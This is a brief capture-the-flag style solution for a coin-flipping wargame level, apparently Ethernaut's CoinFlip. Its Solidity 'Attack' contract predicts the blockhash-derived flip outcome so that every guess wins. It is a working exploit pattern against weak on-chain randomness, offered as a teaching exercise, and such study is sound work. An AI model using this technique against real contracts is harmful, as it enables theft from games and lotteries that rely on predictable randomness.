# Task :
This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

# Solution :

We write another contract called Attack that always wins in the CoinFlip contract 

```shell
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
  CoinFlip flip = CoinFlip(0xa98e328f61f046B4497FBA8A53a37D4e06d67Cdd);

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function attack() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;
  /**
  since it says side==_guess 
  we can use side as our parameter in the attack contract to get it right every single time*/
  
    flip.flip(side);
  }

}

```

Attack has all the calculations of CoinFlip but passes "side" as its parameter instead of "_guess" resulting in a win everytime its called
